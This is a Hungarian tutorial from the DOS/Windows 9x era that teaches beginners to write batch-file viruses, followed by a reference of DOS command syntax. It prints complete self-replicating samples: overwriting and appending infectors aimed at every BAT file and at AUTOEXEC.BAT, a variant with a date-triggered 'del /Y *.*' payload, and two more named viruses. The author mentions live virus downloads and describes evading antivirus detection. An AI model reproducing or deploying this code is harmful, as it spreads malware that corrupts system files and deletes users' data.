BATch virii készítése - 1. rész

A BAT vírus a lehet&otilde; legegyszer&ucirc;bb a vírusok közül, csak minimális programozói
tudás szükséges hozzá, talán ezért rendkívül népszer&ucirc; a kezd&otilde;k körében. A BAT
vírusoknak megvan az az el&otilde;nyük, hogy bármilyen, M$ (DOS, WIN3.1, WIN9X,
WIN2000) oprendszeren úgy futnak, hogy ihaj, ellentétben a már kihalófélben lév&otilde;
DOS-os vírusokkal, melyek elbuknak a mai vindózos fájlokon. A BAT vírusok ezzel
szemben korlátlanul terjednek. A BAT vírust írónak egy dolgot kell a szeme el&otilde;tt
tartani. SZINTE MINDEN GÉPEN VAN LEGALÁBB EGY BAT, AZ AUTOEXEC.BAT. Ebben a
fejezetben nem térnék ki külön a BATCH programozás alapjaira, mert akkor nagyon
hosszú lenne. Feltételezem, hogy rendelkezel bizonyos BAT-os alapismeretekkel.
De tényleg csak egy kicsivel... Úgy próbáltam ezt a tutorialt összehozni, hogy a
legkezdõbb kezdõ is megértse...
Mielõtt bárki belekezd, felhívnám a figyelmét, hogy csakis a saját
felelõsségére. az itt található LETÖLTHETÕ BAT vírusok, kizárólag tanító
jellegûek. Nem vállalok semmiféle felelõsséget, vagy egyebeket az itt leírtakkal
kapcsolatban. A v_ -vel kezdõdõ letölthetõ állományok ÉLÕ VÍRUSOKAT
tartalmaznak, használatukért, vagy bármiféle károkozásért szintén nem vállalok
semmiféle felelõsséget. A pl_ kezdetû fájlok ártalmatlan példaprogramokat
tartalmaznak. Szóval jó tanulást, bármi gond, vagy probléma esetén keressetek. A
címem megtaláljátok itt. Ja, és kérlek benneteket, tartózkodjatok, a hasonló
jellegû levelektõl: Írj nekem egy vírust, Vennék egy vírust, stb.
Köszike :)
Akkor vágjunk bele:

Milyen segédprogramok kellenek?
Bármilyen TEXT szövegszerkeszt&otilde; megteszi. DN, NC editor, Wordpad, Jegyzettömb,
ilyesmik.
Vagy, ha mondjuk 8086-os géped van, és még egy kis bigyó sem megy el rajta,
akkor használhatod a
COPY CON filenév
parancsot is. Az is a BAT virii-k egyik jó tulajdonsága. DOS3.0-tól felfele
minden gépen elfutnak, fejlesztésükhöz nincs szükség hatalmas progikra, sõt, a
fordítással, és egyebekkel sem kell foglalkozni. Minimális erõforrást
fogyasztanak. Tehát kezdõknek rendkívül ajánlott...

A Batch nyelvet a M$ fejlesztette, és használta. A BAT fájl egy olyan DOS
script, melyhez végeredményben nem kell fordítóprogram, az utasítások sorról
sorra hajtódnak végre, egy egyszer&ucirc; TEXT formátumú fájlban. A BAT-ban használt
utasításokat a COMMAND.COM értelmezi, tehát felfoghatjuk egy ún. realtime, vagy
valós idej&ucirc; fordítóprogramnak is, mely a programsorokat a gép által érthet&otilde;
nyelvre fordítja. Természetesen a BAT-ból minden, a Command-line-on vagy
beviteli sorban végrehajtott utasítás is elindítható. Ilyen esetben a BAT mint
egy egyszer&ucirc; Command-line utasítássor viselkedik. A programozási, és
fájlkezelési, stb. elemek természetesen keverhet&otilde;k. Program indítás, törlés,
átnevezés, formattálás, dátumfigyelés, stb.
A Bat természetéb&otilde;l adódóan a "programozó" lehet&otilde;ségei is korlátozottak. Nem
végezhet el bonyolult memóriakezelési illetve változókat igényl&otilde; m&ucirc;veleteket,
tehát egy BAT vírus MINDÍG realtime (amikor elindítják, csak akkor hajtódik
végre), nem stealth (lopakodó), nem képes megszakításokat figyelni, vagy magára
állítani, így pl. arra sem, hogy egyszer&ucirc; másoláskor fert&otilde;zzön. BAT vírust csak
az &otilde;t tartalmazó BAT elindításakor aktiválhatunk.

A legtöbb Batch virii nagyon egyszer&ucirc; módját használja a terjedésnek. Egyszer&ucirc;en
a %0 (0. paraméter = aktuális fájl elérési útja és neve) segítségével saját
magát, vagyis 1 TELJES BAT-OT átmásolnak a talált bat tetejébe. Vagyis
felülírják azt. ezt a copy paranccsal érik el.
Példa:
Copy /Y %0 C:\Autoexec.bat >nul
Némi magyarázat:
A paraméterek vizsgálatára nem csak a %0, de a %1, %2, stb. is használható,
egészen 9-ig. ezek a "változók" meghívása a %-jel segítségével történik (ahogy a
többié is). A %5 tehát visszaadja a BAT 5. paraméterét. (Ha volt ilyen.)
/Y nem kér beleegyezést felülíráskor. (még szép)
A >nul a copy üzeneteit "elhalgatja". Nincs kimenet a képerny&otilde;n. De nem csak a
copy-t, hanem bármely más DOS-os program kimenetét átirányítja a NUL eszközre,
vagyis sehova. Ha a > jel mellé filenevet írunk, akkor a képernyõn megjelenõ
üzenetek mind abba a fileba kerülnek. Pl.:
ARJ /? >arjhelp.txt
Ezzel a módszerrel remekül lehet, mondjuk helpet listázni. Ha a > jelet
megfordítjuk: < -ra, akkor az adatmozgás pont fordítva fog megtörténni. Ha a
DOS-os progi "jól" van megírva, és használ paramétereket az un. DOS PROMPT-ból,
v. COMMAND LINE-ból, akkor a paramétereket egy fileból fogja kiolvasni. Ez
nagyon hasznos hosszú paramétersorok készítésekor, stb... Ha a > jel helyett >>
jelet használunk, a kimeneti fájl, ha létezik, nem íródik felül, hanem
hozzáfûzõdik.
Most következzen egy FELÜLÍRÓS BAT VÍRUS, az els&otilde; vírusom, legalább is egy
részlete, a motorja: (Az Fprot Black.A-nak ismeri fel)

@Echo OFF
FOR %%f IN (*.BAT ../*.BAT) DO COPY %0 %%f >nul
Magyarázat:
@Echo off - kikapcsolja a fájl sorainak megjelenítését. Ha a sorok elejére @
jelet teszünk, akkor nem kell az ECHO-t beállítani, a sor semmiképpen nem fog
megjelenni. Az echo-t helyettesíthetjük a CTTY NUL-al is, sõt, ha a sor elejére
@ jelet teszünk, akkor az echo-t akár békén is hagyhatjuk, mert az így jelölt
sorok automatikusan nem kerülnek kiírásra. Az @ jelnek még más különleges
feladata is lesz, de errõl majd késõbb. Pl.:
@ECHO Csak a kiírás hajtódik végre, a parancssor nem látható

Ilyen esetben a @ és az azt követõ parancs közé nem kell szünet. Sõt. Tilos.
Annyit azért tisztázzunk, hogy a programozás során magyar betûket kizárólag ECHO
után lehet használni...

set - Globális változó beállítása. (Ha elfogyott a környezeti beállításokhoz
szükséges terület, akkor a BAT vírosk nagy része meg van l&otilde;ve.) Pl.:

SET TEMP=C:\WINDOWS\TEMP

(ez a sor ált. minden autoexec-ben benne van.) Ezután a C:\WINDOWS\TEMP
könyvtárra hivatkozhatunk csak a TEMP szócskával, pl.:

ECHO %TEMP%

Ez a sor megjeleníti a TEMP tartalmát, de ugyanezt fájlokkal is eljátszhatjuk:

SET TEMP=C:\WINDOWS\TEMP
SET MYFILE=C:\MYDIR\MYFILE.TXT
ECHO %MYFILE%
COPY /Y %MYFILE% %TEMP%

Ezek a paramcsok persze a COMMAND LINE-ban is mûködnek. Ha bármelyik sort
beírjuk, olyan, mintha egy BAT 1 sorát hajtanánk végre...
for - Egy nagyon egyszer&ucirc;, ám rendkívül hatásos parancs. Minden, a () között
deklarált fájl keresése, melynek eredményét a %%f-be teszi. Ami a DO után jön,
bármilyen utasítás lehet, ami végrehajtódik a talált fájlokra.
*.bat - aktuális alkönyvtárban.
../*.BAT - AUTOEXEC.BAT rulez! :)
Mi a különbség a %%f és %%b között?
A %%f használatával a DO utáni sor minden talált fájlra végrehajtódik. REALTIME
A %%b használatával a DO utáni sor csak akkor hajtódik végre, mikor az el&otilde;z&otilde;
fájlm&ucirc;velet befejez&otilde;dött.
%%f - Bat-okat keres, és minden találatnál a talált BAT neve belekerül ebbe a
"változóba".
Ha a változónk több mint egy betû, akkor a következõ képpen kell hivatkoznunk
rá:
%változó% vagyis százalékjelek közé kell zárni. Az egybetûsekre a %%betû formát
használjuk.
copy... nos, gondolom érthet&otilde;

Nénány érdekes elágaztatás a DO után (IF = HA, program elágaztatás):
Használat: IF [feltétel] [utasítás]

IF %1 ECHO OK -Ha van a fájlnak paramétere, akkor hajtja végre az ECHO-t.
IF EXIST %1 vagy IF EXIST %%f vagy stb... - Ha az EXIST után megadott fájl, (ami
lehet változóban %%-al jelölve, vagy paraméterben (%) vagy simán is) létezik
IF NOT EXIST -Az EXIST tagadása. Ha a megadott fájl nem létezik. A NOT szócska
minden eldöntend&otilde; (boolean: igen/nem) parancs elé téve úgy módosít, hogy ha
valami nem következik be, akkor hajtódik végre az utasítás.

A következ&otilde; 2 sorral, DEBUG-olhatunk is:
Letölthetõ: pl_debug.bat
@Echo OFF
for %%f in (*.bat ../*.bat) do Echo %%f
Magyarázat: A talált fájlok kiírása.

Készen is van az els&otilde; BAT vírusunk. De be kell, hogy valljuk, a felülírás nem
egy elegáns megoldás. Hogyan lehetne a vírust rávenni a hozzáf&ucirc;zésre? A megoldás
egyszer&ucirc;nek néz ki.
@Echo OFF
FOR %%f IN (*.BAT ../*.BAT) DO COPY %0+%%f %%f>nul
Vagyis: a vírusunk és a talált BAT összemásolása. a sorrend tetsz&otilde;leges, ebben
az esetben a vírus kerül az els&otilde; helyre. Nade. Ez az eljárás a teljes file-t
átmásolja, így a következ&otilde; fert&otilde;zésnél már nem csak a vírus, de a fert&otilde;zött fájl
is másolásra kerül. Pl.:
Mondjuk ez van a fert&otilde;zött fileban a fert&otilde;zés után:
@Echo OFF
FOR %%f IN (*.BAT ../*.BAT) DO COPY %%f+%0 %%f>nul
Echo Öntyömpöntyöm
Echo.
Echo Pöntyömöntyöm
Echo.
REM Ez az én 1. BAT-om
A következ&otilde; fert&otilde;zéskor a file már így néz ki:
@Echo OFF
FOR %%f IN (*.BAT ../*.BAT) DO COPY %%f+%0 %%f>nul
copy /Y %0 +BlaCk1 BlaCk1
Echo Öntyömpöntyöm
Echo.
Echo Pöntyömöntyöm
Echo.
REM Ez az én 1. BAT-om
Echo.
Echo ez már a 2. BAT-om.
Rem Copyright nemcsináloksemmit
REM Hát ez baró
mem /a /c /p
Szóval elég kellemetlen. Ezzel a fantasztikus eljárással hatalmas BAT fájlokat
készíthetünk. Mivel a progi nem ellenõrzi, (nem tudja ellenõrizni), hogy a
talált fájl már fertõzött e vagy sem, így egy fájlt akárhányszor felülfertõzhet.
ez azonban növeli a terjedési sebességet (hozzáfûzésnél), mert a virii egy
BAT-ban többször is végrehajtódik, kivéve, ha nem tartalmaz olyan kódot, mely
megállítja a BAT futását. Ilyen utasítás pl.: az
EXIT
Amit csak így "simán" kiadunk, és a BAT-unk már meg is állt.
FOR %%f IN (*.BAT ../*.BAT) DO COPY %%i+%0 %%i>nul
utasítást a következ&otilde;, még a BAT-os &otilde;skorból származó 2 sorra is kicserélhetjük,
aminek a legnagyobb hátrány az, amir&otilde;l már szóltam, vagyis, ha elfogy a
környezeti beállítások tárolásához a mem (érdemesebb a fentit használni):
for %%f in (*.bat ../*.bat) do set BlaCk=%%f
COPY BlaCk+%0 %%f>nul
Most, hogy szinte mindent tudunk a felülíró BAT-okról, most nézzük meg azokat,
amelyek már ténylegesnek vírusnak nevezhetõk. Ezek a nem felülíró, vagy más
néven hozzáfûzõ, módosító (batch appender) vírusok. A probléma most sem
bonyolultabb mint az elõzõ esetben... A lényeg az, hogy magunkat egy fájl
végére, elejére, vagy belsejébe másoljuk. Csak egy különbség van. A hordozó BAT
ne kerüljön át az újonnan fertõzött állományba. Hogy lehetne ezt megoldani? Nos,
nagyon egyszerûen. Nézzük meg a következõ forrást, ami mellesleg az elõbb
említett BAT, felülírós vírusom BLACK.ORIGINAL.B változata. (Minden
próbálkozásom ellenére, az FPROT mégis, mint BLACK.A ismeri fel... Szar ügy. :)
):
for %%f in (*.bat ..\*.bat) do set BlaCk1=%%f
find "BlaCk1" %0 >>%BlaCk1%


Mi az, ami elsõre feltûnik? Hát kinek mi. De nekem az a bizonyos BlaCk1 szócska.
Furcsa módon minden sorban ismétlõdik, és van egy olyan utasítás, amivel eddig
még nem találkoztunk, a find. A mechanizmus nagyon egyszerû. A viriinknek, ha
csak magát akarja átmásolni, ismernie kell a saját sorait, ezt pedig CSAK úgy
érhetjük el, ha a sorok valamiben megegyeznek, úgy, hogy az a program futását ne
zavarja. Tehát nincs más hátra, mint bevezetni egy környezeti változót, mondjuk
a BlaCk1-et. Fontos, hogy a betûméret minden sorban stimmeljen. A memóriabeli
problémákról már szóltam. Tehát ha elfogy a környezeti beállításokhoz szükséges
terület, akkor a virii meg van lõve.

FIND - utasítás. Megnyitja az utána, a 2.paraméterben megadott file-t, (%0 =
aktuális fájl, amiben a virii van) ami lehet akár környezeti változó is, (ezt
ugye tisztáztuk.) és az elsõ paraméterben megadott szöveget, un.: karakterláncot
keresi benne, és a keresés eredményét egy globális változóba, az ERRORLEVEL-be
teszi, akárcsak az összes többi parancs. Ha az utolsó parancs elvégzése sikeres
volt, az ERRORLEVEL=0. Ha nem, akkor egy hibakód, vagy 1, de mindenképpen
nagyobb mint 0. A harmadik paraméter, a <<%BlaCk1% azokat a sorokat, melyeknen a
keresendõ karakterlánc megtalálható,  a %BlaCk1% fájlhoz fûzi (< esetén
felülírja). A FIND parancsról érdemes helpet kérni, tanulmányozni, ugyanis a
talált sorokat a képernyõn jeleníti meg (magát a vírust), és csak ezen
képernyõre történõ kiírást irányítjuk át, a talált bat file-ra. A fenti esetben
nem történik ellenõrzés azt illetõen, hogy a file már fertõzött e. Nézzük
ugyanezen forrás kicsit bõvített változatát:

for %%f in (*.bat ..\*.bat) do set BlaCk1=%%f
find "BlaCk1" %BlaCk1% >nul
if errorlevel 1 find "BlaCk1"<%0.BAT>>%BlaCk1%

Az ERRORLEVEL a FIND esetében akkor 1, ha a keresett szöveg a fileban nem
található. Hogy elkerüljük, hogy nem fertõzött fájlok esetleg tartalmazzák a mi
vírusunk NEVÉT, próbáljunk meg kis-, nagy betûkbõl, számokból és egyéb
karakterekbõl álló nevet kitalálni.
Tehát, ha a vírusunk nincs benne a talált fájlban, akkor megfertõzzük, SZINTÉN A
FIND UTASÍTÁSSAL, tehát attól függõen, hogy a kimenetet hova irányítjuk, a FIND
utasítás nagyon fontos szerepet tölt be.
IF ERRORLEVEL 1 - Ha hiba volt, akkor az 1-es után lévõ utasítás végrehajtódik.

Tehát: a vírus minden sorának tartalmazni kell a "nevét". Most lássunk erre egy
példát. Mondjuk a BlaCk2 variáns jó is lesz erre a célra. Külön erre a célra
készült, ha ráengedtek egy vírusírtót, az még nem ismeri. Még azt sem mondja rá,
hogy ismeretlen vírus. Különlegessége, hogy NEM írja felül az eredeti
BLACK1.A-t, (Letölthetõ innen) és nem "annyira" destruktív. Aki a BLACK1.A-t
szeretné tanulmányozni, az várjon a következõ számig, különben kellemetlen
meglepetésben lehet része, mikor belenéz...Szóval a BLACK1.B:
Letölthetõ: v_black2.bat

@Echo OFF%[BlaCk1]%
REM Less destructive version of (BlaCk1)! DOES NOT OVERWRITE OLD Black1.
for %%f in (*.bat ..\*.bat) do set BlaCk1=%%f
find "BlaCk1"<%BlaCk1%>nul
if errorlevel 1 find "BlaCk1"<%0>>%BlaCk1%
echo.|date|find "04.16"<nul%[BlaCk1]%
if errorlevel 0 goto :BlaCk1
if errorlevel 1 goto :BlaCk1_KILL
:BlaCk1_KILL
Cls REM BlaCk1
ECHO.Hello! I am the Black Death (BlaCk1) from Hungary! Just a moment...
del /Y *.* [%BlaCk1%]
Echo.Bang! Now you are death! (BlaCk1)
:BlaCk1

Ez a virii, szinte minden eddig tanult dolgot magába foglal. Amirõl még nem
beszéltem, az a GOTO utasítás:
Bármilyen BAt file belsejében van arra lehetõség, hogy bizonyos részeket
átugorjunk, tehát a sorok nem egymás után hajtódnak végre. A label-nek, v.
címkének nevezett valamiket a :NEV
utasítással hozhatjuk létre, minden külön magyarázat nélkül (Csak angol betûk
lehetnek a név-ben). Ha az utasítás végrehajtás egy ilyen sorhoz ér, egyszerûen
nem veszi figyelembe, mintha ott sem lenne Az ilyen LABEL-eknek CSAK A GOTO
utasítással van értelmük. Vagyis:
GOTO :címke
formában. így a GOTO és a LABEL közti részt átugorja, és a label után következõ
sorban folytatódik a végrehajtás. Természetesen elõre, és hátra is
hivatkozhatunk. A következõ néhány sor végtelenítve írja a képernyõre, hogy
Black Cat! ( :) az a nyavajás ego...) (megszakítani CTRL+C -vel, vagy
CTRL+BRAKE):
Letölthetõ: pl_bc.bat
:INDUL
@ECHO BLACK CAT
@GOTO :INDUL
Ennyit a GOTO-ról. Nézzétek meg a példákat, és minden érthetõvé válik.
a fent felsorolt dolgok, tulajdonságok, utasítások, természetesen végtelenül
kombinálhatók. az adja meg a BAT virii egyediségét. Amit itt leírtam, az csak
egy lehetséges út. Még úgy is sokminden hátra van. Egy BAT virii többet tud,
mint azt mi gondolnánk, na de errõl késõbb.
Akkor jöjjenek a példák:



Vírusnév: DIRECT.A
Letölthetõ: v_666.bat

@echo off
@set inf=n
@set infect=n
@if %INF%==Y goto scan
@echo @SET INF=Y >a.666
@echo @call %0.bat >>a.666
@echo @echo Batch virus greets You !>>a.666
@TYPE AUTOEXEC.BAT >>A.666
@COPY A.666 AUTOEXEC.BAT >NUL
@SET INF=Y
:scan
@IF %INFECT%==Y GOTO END
@c:
@cd\
@dir %0.bat /s|find /i "Direct" >c:\a.666
@echo exit >>c:\a.666
@echo @copy %%2\%0.bat c:\ >c:\director.bat
@command <c:\a.666 >nul
@c:
@cd\
@dir /ad /s|find /i "Direct" >a.666
@echo exit >>a.666
@echo @if not exist %%2%0.bat copy c:\%0.bat %%2 >c:\Director.bat
@command < a.666 >nul
@del a.666
@del director.bat
@del %0.bat
@SET INFECT=Y
:END
@echo Good command or file name!



Vírusnév: CODE.B
Letölthetõ: v_code.bat

@echo off%_CoDe%
if '%1=='Inf goto CoDe_inf
if exist c:\_CoDe.bat goto CoDe_ok
if not exist %0.bat goto CoDe_out
find "CoDe"<%0.bat>c:\_CoDe.bat
:CoDe_ok
for %%a in (*.bat ..\*.bat) do call c:\_CoDe Inf %%a
if errorlevel 1 echo [CoDe] the working one.
goto CoDe_out
:CoDe_inf
find "CoDe"<%2>nul
if errorlevel 1 type c:\_CoDe.bat>>%2
:CoDe_out



FPROT REPORT



Ennyit a példákról. Most, hogy már elvileg sokat tudunk, nézzünk néhány egyszerû
DOS utasítást, melyek színessé tehetik BAT-os vírusunkat:

      PARANCSLEÍRÁS
      ATTRIB
       Fájlattribútumok megjelenítése vagy módosítása

      ATTRIB [+R|-R] [+A|-A] [+S|-S] [+H|-H] [[meghajtó:][útvonal]fájlnév] [/S]

      + Attribútum beállítása
      - Attribútum törlése
      R Írásvédett fájlattribútum
      A Archivált fájlattribútum
      S Rendszer fájlattribútum
      H Rejtett fájlattribútum
      /S A megadott útvonal minden könyvtárában módosítja a fájlokat.
      TYPESzövegfájlok tartalmának megjelenítése

      TYPE [meghajtó:][útvonal]fájlnév
      DELEgy vagy több fájl törlése

      DEL [meghajtó:][útvonal]fájlnév [/P]
      ERASE [meghajtó:][útvonal]fájlnév [/P]

      [meghajtó:][útvonal]fájlnév A törlendõ fájlok megadása. Több fájl is
      megadható helyettesítõ karakterek használatával.
      /P A fájlok törlése elõtt megerõsítést kér.
      MOVEFájlok áthelyezése valamint fájlok és könyvtárak átnevezése

      Egy vagy több fájlt áthelyezéséhez:
      MOVE [/Y | /-Y] [meghajtó:][útvonal]fájlnév1[,...] cél

      Könyvtár átnevezéséhez:
      MOVE [/Y | /-Y] [meghajtó:][útvonal]könyvtárnév1 könyvtárnév2

      [meghajtó:][útvonal]fájlnév1 Az áthelyezendõ fájl vagy fájlok nevét
      és helyét adja meg.
      cél A fájl új helyét adja meg. A cél egy meghajtó
      betûjelét és kettõspontot, egy könyvtárnevet
      vagy ezek kombinációját tartalmazhatja. Ha

      egyetlen fájlt helyez át, akkor egy fájlnevet
      is belefoglalhat, ha az áthelyezéskor a fájlt
      át szeretné nevezni.
      [meghajtó:][útvonal]könyvtárnév1 Az átnevezendõ könyvtárat adja meg.
      könyvtárnév2 A könyvtár új nevét adja meg.

      /Y Elnyomja a könyvtár létrehozásának vagy a cél
      felülírásának megerõsítését.
      /-Y Kéri a könyvtár létrehozásának vagy a cél
      felülírásának megerõsítését.

      A /Y kapcsoló szerepelhet a COPYCMD környezeti változóban.
      Ezt felül lehet bírálni a parancssorban a /-Y kapcsolóval.
      RENFájl és könyvtár átnevezése

      RENAME [meghajtó:][útvonal]fájlnév1 fájlnév2
      REN [meghajtó:][útvonal]fájlnév1 fájlnév2

      Megjegyzés: célként új meghajtó vagy elérési út nem adható meg.
      DELTREEKönyvtár és a benne lévõ összes alkönyvtár törlése

      Egy vagy több fájl és könyvtár törléséhez:
      DELTREE [/Y] [meghajtó:]elérési út [[meghajtó:]elérési út[...]]

      /Y Elnyomja az alkönyvtár törlésének megerõsítését
      kérõ szöveget.
      [meghajtó:]elérési út a törlendõ könyvtár nevét adja meg.

      Megjegyzés: A DELTREE parancsot körültekintõen kell használni. A megadott
      könyvtárban lévõ összes fájl és könyvtár törlõdik.
      STARTWindows vagy MS-DOS program indítása.
      START [Beállítások] program [paraméterek...]
      START [Beállítások] dokumentum.kiterjesztés
      /m[inimalizált] Az új program minimalizált (háttérben) futtatása
      /max[imalizált] Az új program maximalizált (elõtérben) futtatása
      /r[elõzõ méret] Az új program elõzõ méretben (elõtérben) futtatása (alap)
      /w[várakozás]   Nem tér vissza, amíg az elindított progi ki nem lép.
      CALLEgyik parancsfájl (batch fájl) hívása egy másikból

      CALL [meghajtó:][útvonal]fájlnév [parancsfájl paraméterek]

      parancsfájl paraméterek A parancsfájl által igényelt
      parancssor-adatok megadása
      CHOICEVárakozás arra, hogy a felhasználó kiválasszon egyet a
      választékhalmazból.

      CHOICE [/C[:]választék] [/N] [/S] [/T[:]c,nn] [szöveg]

      /C[:]választék Az engedélyezhetõ billentyûket adja meg. Az alapértelmezés
      IN
      /N A prompt karakterlánc végén nem jeleníti meg a választékot és
      a kérdõjelet (?).
      /S Kis- és nagybetûk megkülönböztetése.
      /T[:]c,nn Alapértelmezett választás nn mp után.
      szöveg A megjelenítendõ karakterlánc

      ERRORLEVEL a megnyomott billentyû választékban elfoglalt helye.
      DATEA dátum megjelenítése vagy beállítása

      DATE [dátum]

      A mai dátum beállításának megjelenítéséhez és egy új dátum megadásához
      írd be paraméterek nélkül a DATE parancsot. A dátum megtartásához nyomja
      meg
      az ENTER billentyût.
      DOSKEYParancssorok szerkesztése, parancssorok újrahívása és makrók
      létrehozása

      DOSKEY [/kapcsoló ...] [makrónév=[szöveg]]

      /BUFSIZE:méret A makró- és parancspufferméret megadása (alapérték:512)
      /ECHO:on|off Be- és kikapcsolja a makróbõvítéseket (alapérték:on)
      /FILE:fájl Makrók listáját tartalmazó fájl megadása
      /HISTORY A memóriában tárolt parancsok megjelenítése
      /INSERT Új karakterek beszúrása a sorba gépelés közben
      /KEYSIZE:méret A billentyûzetpuffer méretének beállítása (alapérték:15)
      /LINE:méret A sorszerkesztõ puffer maximális mérete (alapérték:128)
      /MACROS Az összes DOSKey makró megjelenítése
      /OVERSTRIKE Az új karakterek felülírása gépelés közben (alapértelmezés)
      /REINSTALL A DOSKey új másolatának telepítése
      makrónév A létrehozott makró nevének megadása
      szöveg A makróhoz hozzárendelendõ parancsok megadása

      A FEL és LE nyíl parancsot hív vissza.
      Az Esc törli az aktuális parancsot.
      Az F7 a korábbi parancsokat jeleníti meg.
      Az Alt+F7 törli a korábbi parancsokat.
      [karakterek]F8 A [karakterek] paraméterrel kezdõdõ parancsot keresi meg.
      Az F9 a parancsot a száma szerint választja ki.
      Az Alt+F10 törli a makródefiníciókat.

      A következõ speciális kódokat DOSKey makródefiníciókban lehet használni:
      $T Parancselválasztó: több parancs engedélyezése a makróban
      $1-$9 Kötegparaméterek: a kötegfájlok %1-%9 paramétereivel ekvivalens.
      $* A kód helyére a parancssorban, a makrónév után megadott érték kerül.
      COMMANDElindítja a Windows parancsértelmezõ egy új példányát.

      COMMAND [[meghajtó:]útvonal] [eszköz] [/E:nnnnn] [/L:nnnn] [/U:nnn] [/P]
      [/MSG]
      [/LOW] [/Y [/[C|K] parancs]]

      [meghajtó:]útvonal A COMMAND.COM-ot tartalmazó könyvtár megadása
      eszköz A parancsbemenethez és -kimenethez használt eszköz
      /E:nnnnn A kezdõ környezet méretének beállítása nnnnn bájtra.
      (az nnnnn 256 és 32768 közötti érték legyen).
      /L:nnnn A belsõ pufferhossz mérete (a /P kapcsolóval együtt használt)
      (az nnnn 128 és 1024 közötti érték legyen).
      /U:nnn A bemeneti puffer hossza (a /P kapcsolóval együtt használt).
      (az nnn 128 és 255 között legyen).
      /P Az új parancssor állandóvá tétele (nem lehet kilépni).
      /MSG Az összes hibaüzenet tárolása a memóriában (a /P-vel együtt).
      /LOW A COMMAND rezidens adatai az alsó memóriaterületen maradnak.
      /Y A parancsfájl léptetése a /C vagy a /K kapcsoló szerint
      /C parancs Végrehajtja a megadott parancsot, majd visszatér.
      /K parancs Végrehajtja a megadott parancsot, és folytatja a futást.
      %TMP% , %TEMP%Környezeti változók, a TEMP könyvtár helyét adják meg.
      Ált.: C:\WINDOWS\TEMP
      %WINDIR%- Környezeti változó, a WINDOWS könyvtár helyét adja meg.
      Ált.: C:\WINDOWS
      FINDFájlban vagy fájlokban lévõ szöveges karakterlánc keresése

      FIND [/V] [/C] [/N] [/I] "karakterlánc" [[meghajtó:][útvonal]fájlnév[
...]]

      /V Az összes sor megjelenítése, amely NEM tartalmazza a karaktereket.
      /C Csak a karaktereket tartalmazó sorok számának megjelenítése
      /N Sorszám megjelenítése a sorok mellett
      /I A kis- és nagybetûket nem veszi figyelembe kereséskor.
      "karakterlánc"
      A keresendõ szöveges karakterláncot adja meg.
      [meghajtó:][útvonal]fájlnév
      A keresendõ fájl(ok) megadása

      Ha nincs megadva elérési út, akkor a FIND a parancssorban beírt vagy egy
      másik parancsból kapcsolt szöveget keres.
      IFFeltételes feldolgozás végrehajtása parancsfájlban (batch fájl)

      IF [NOT] ERRORLEVEL szám parancs
      IF [NOT] karakterlánc1==karakterlánc2 parancs
      IF [NOT] EXIST fájlnév parancs

      NOT Annak megadása, hogy a Windows csak hamis állapot esetén
      hajtsa végre a parancsot
      ERRORLEVEL szám Igaz állapotot eredményez, ha az elõzõleg futtatott
      program a számnál nagyobb vagy egyenlõ kilépési kóddal tért vissza.
      parancs Annak a parancsnak a megadása, amely a feltétel teljesülése esetén
      végrehajtódik.
      karakterlánc==karakterlánc2  Igaz állapotot eredményez a megadott
      karakterláncok egyezõsége esetén.
      EXIST fájlnév Igaz állapotot eredményez, ha a megadott fájl létezik.
      FORMegadott parancs futtatása egy fájlhalmaz minden egyes fájlján

      FOR %változó IN (halmaz) DO parancs [parancsparaméterek]

      %változó Cserélhetõ paraméter megadása
      (halmaz) Fájlhalmazok megadása. Helyettesítõ karakterek is használhatók.
      parancs A fájlokon végrehajtott parancsok megadása parancsparaméterek
      A megadott parancs paramétereit vagy kapcsolóit adja meg.

      A FOR parancs parancsfájlban a változót a %%változó szintaxissal kell
      megadni %változó helyett.
      SHIFTCserélhetõ paraméterek helyének módosítása parancsfájlban (batch
fájl)
      PROMPTA Windows parancssort módosítja.

      PROMPT [szöveg]

      szöveg Új parancssor megadása

      A parancssor normál karakterekbõl és az alábbi speciális jelekbõl állhat:

      $Q = (egyenlõségjel)
      $$ $ (dollárjel)
      $T Aktuális idõ
      $D Aktuális dátum
      $P Aktuális meghajtó és elérési út
      $V Windows verziószám
      $N Aktuális meghajtó
      $G > (nagyobb jel)
      $L < (kisebb jel)
      $B | (függõleges vonás)
      $H Backspace (az elõzõ karakter törlése)
      $E Escape kód (27-es ASCII kód)
      $_ Kocsivissza és soremelés

      A parancssor alapértékének visszaállításához paraméterek nélkül írd be a
      PROMPT parancsot.
      DIRKönyvtárban lévõ fájlok és alkönyvtárak listájának megjelenítése

      DIR [meghajtó:][elérési út][fájlnév] [/P] [/W] [/A[[:]attribútumok]]
      [/O[[:]rendezés]] [/S] [/B] [/L] [/V] [/4]

      [meghajtó:][útvonal][fájlnév]
      Megadja a listázandó meghajtót, könyvtárat, illetve fájlokat.
      (Lehet bõvített fájlmegadás vagy több fájl megadása is.)
      /P Várakozás minden képernyõ után
      /W Széles listázási formátum használata
      /A A megadott attribútumú fájl megjelenítése
      attribútumok D Könyvtárak R Írásvédett fájlok
      H Rejtett fájlok A Archiválandó fájlok
      S Rendszerfájlok - logikai NEM elõtag
      /O A fájlok rendezett sorrendû listázása
      rendezés N Név szerint (ábécérendben)
      S Méret szerint (elõbb a kisebbek)
      E Kiterjesztés szerint (ábécérendben)
      D Dátum és idõ szerint (elõbb a korábbiak)
      G Elõbb a csoportkönyvtárak
      - Fordított sorrend (elõtag)
      A A legutóbbi hozzáférés szerint (elõbb a korábbiak)
      /S Adott könyvtárban és alkönyvtáraiban lévõ fájlok megjelenítése
      /B Egyszerû formátum (fejléc és összegzés nélkül
      /L Kisbetûk használata
      /V Részletes mód
      /4 négyjegyû évszámok (/V -vel együtt hatástalan).

      A DIRCMD környezeti változóban elõre be lehet állítani kapcsolókat.
      Az elõre beállított kapcsolókat kötõjellel (-) lehet felülbírálni;
      például: /-W.
      COPYEgy vagy több fájl másolása egy másik helyre

      COPY [/A | /B] forrás [/A | /B] [+ forrás [/A | /B] [+ ...]] [cél]
      [/A | /B]] [/V] [/Y | /-Y]

      forrás A másolandó fájl(ok) megadása
      /A A fájl ASCII szövegfájl
      /B A fájl bináris fájl
      cél Az új fájl(ok) könyvtár-, illetve fájlnevének megadása
      /V Ellenõrzés az új fájlok írásakor
      /Y A megerõsítés kikapcsolása létezõ
      fájlok felülírásakor
      /-Y A megerõsítés bekapcsolása létezõ
      fájlok felülírásakor

      A /Y kapcsolót elõre be lehet állítani a COPYCMD környezeti változóban.
      Ez felülbírálható a parancssorban a /-Y kapcsolóval.

      Fájlok hozzáfûzéséhez célként adjon meg egyetlen fájlt, de forrásként több
